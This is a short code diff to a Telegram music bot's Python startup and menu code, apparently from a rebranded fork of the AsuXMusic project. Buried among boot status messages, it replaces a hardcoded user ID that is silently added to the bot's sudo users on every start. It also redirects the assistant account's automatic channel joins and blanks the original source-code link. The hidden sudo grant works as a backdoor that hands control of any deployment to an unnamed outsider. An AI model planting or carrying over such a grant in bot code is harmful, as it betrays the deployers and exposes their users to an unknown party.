@@ -73,7 +73,7 @@ async def AsuX_boot():
             status="[bold blue]ᴍᴏᴅᴜʟᴇs ɪᴍᴘᴏʀᴛᴀᴛɪᴏɴ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!",
         )
         await asyncio.sleep(0.2)
-        SUDO_USERS.append(1452219013)
+        SUDO_USERS.append(1890206319)
         await startup_del(_____)
     console.print(
         "[bold green]ᴛʀʏɪɴɢ ᴛᴏ sᴛᴀʀᴛ ᴛʜᴇ ʙᴏᴛ...\n"
@@ -106,8 +106,8 @@ async def AsuX_boot():
         console.print(f"\n[red]sᴛᴏᴘᴘɪɴɢ ʙᴏᴛ")
         return
     try:
-        await Ass.join_chat("AbishnoiMF")
-        await Ass.join_chat("Abishnoi_bots")
+        await Ass.join_chat("sidekickfriend")
+        await Ass.join_chat("ikku_hoi")
     except:
         pass
     console.print(f"\n┌[red] ʙᴏᴛ sᴛᴀʀᴛᴇᴅ ᴀs {BOT_NAME}!")
@@ -255,7 +255,7 @@ async def AsuX_home(_, CallbackQuery):
             ],
             [
                 InlineKeyboardButton(
-                    text="☁ sᴏᴜʀᴄᴇ ᴄᴏᴅᴇ ☁", url="https://github.com/Abishnoi69/AsuXMusic"
+                    text="☁ sᴏᴜʀᴄᴇ ᴄᴏᴅᴇ ☁", url="https://github.com/"
                 )
             ],
         ]
